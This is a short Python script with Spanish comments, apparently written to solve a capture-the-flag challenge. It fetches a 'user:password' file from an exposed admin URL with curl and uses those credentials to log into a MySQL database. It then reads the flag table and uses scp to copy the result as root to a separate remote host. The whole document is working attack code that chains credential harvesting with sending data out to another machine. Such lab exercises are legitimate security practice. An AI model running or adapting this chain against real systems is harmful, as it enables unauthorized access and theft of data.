import subprocess
import mysql.connector

# Variables de configuración
curl_url = "http://10.0.1.101:9798/admin/users.txt"
mysql_host = "10.0.1.101"
mysql_port = 8833
mysql_database = "ctf_db"
mysql_table = "flag"
mysql_column = "flag_value"
scp_target = "root@10.255.254.210:/root/xxx.flag"

try:
    # Ejecutar el comando curl y capturar la salida
    print("Ejecutando curl para obtener credenciales...")
    curl_output = subprocess.check_output(["curl", curl_url], text=True).strip()

    # Extraer las credenciales del formato user:password
    if ":" not in curl_output:
        raise ValueError("La salida de curl no contiene el formato esperado 'user:password'")

    user, password = curl_output.split(":", 1)
    print(f"Credenciales obtenidas: Usuario='{user}', Contraseña='{password}'")

    # Conectar a la base de datos MySQL
    print("Conectando a MySQL...")
    connection = mysql.connector.connect(
        host=mysql_host,
        port=mysql_port,
        user=user,
        password=password,
        database=mysql_database
    )

    cursor = connection.cursor()

    # Consultar la última fila del valor solicitado
    query = f"SELECT {mysql_column} FROM {mysql_table}"
    print(f"Ejecutando consulta: {query}")

    cursor.execute(query)
    result = None
    for row in cursor:
        result = row  # Guardar cada fila, la última sobrescribe las anteriores

    if result:
        flag_value = result[0]
        print(f"Valor de la bandera encontrado: {flag_value}")

        # Guardar la bandera en un archivo temporal
        with open("/tmp/flag.txt", "w") as flag_file:
            flag_file.write(flag_value)

        # Copiar el archivo a la ubicación remota con scp
        print("Copiando la bandera a la ubicación remota...")
        subprocess.check_call(["scp", "/tmp/flag.txt", scp_target])
        print("Bandera copiada exitosamente.")

    else:
        print("No se encontró ninguna bandera en la base de datos.")

except subprocess.CalledProcessError as e:
    print(f"Error al ejecutar curl o scp: {e}")
except mysql.connector.Error as e:
    print(f"Error al conectar o consultar MySQL: {e}")
except Exception as e:
    print(f"Error inesperado: {e}")
finally:
    # Cerrar la conexión a la base de datos si está abierta
    try:
        if connection.is_connected():
            cursor.close()
            connection.close()
            print("Conexión a MySQL cerrada.")
    except NameError:
        pass